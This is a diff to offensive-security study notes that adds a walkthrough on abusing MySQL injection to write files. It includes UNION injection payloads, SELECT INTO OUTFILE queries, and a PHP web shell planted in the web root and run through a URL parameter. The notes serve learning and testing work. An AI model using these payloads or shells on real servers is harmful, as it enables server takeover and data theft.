@@ -186,6 +186,65 @@ Take a wordpress installation that uses a mysql database. If you manage to login
 Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
 ```
 
+Another example: 
+
+**To be able to write files to the back-end server using a MySQL database, we require three things:**
+
+**1.** User with `FILE` privilege enabled. If our user is root:
+
+```sql
+SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+```
+
+**2.**  MySQL global `secure_file_priv` variable not enabled
+
+```sql
+SHOW VARIABLES LIKE 'secure_file_priv';
+
+# Final SQL query
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+
+# In an example of an UNION query attack:
+# cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+
+```
+
+The [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the `FILE` privilege. However, `MySQL` uses `/var/lib/mysql-files` as the default folder. This means that reading files through a `MySQL` injection isn't possible with default settings.
+
+**3.**  Write access to the location we want to write to on the back-end server. The [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) statement can be used to write data from select queries into files. This is usually used for exporting data from tables.
+
+```sql
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+
+# This will create a test.txt file owned by the mysql user
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+
+# Example in an UNION injection attack:
+cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+```
+
+**Tip**: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.
+
+Now, uploading a shell. This is a PHP shell:
+
+```php
+<?php system($_REQUEST[0]); ?>
+```
+
+Let's replicate the UNION injection attack:
+
+```sql
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+```
+
+This can be verified by browsing to the `/shell.php` file and executing commands via the `0` parameter, with `?0=id` in our URL:
+
+```html
+https://$ip:$port/shell.php?0=id
+```
+
+
+
 ### Writing files
 
 `MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys).
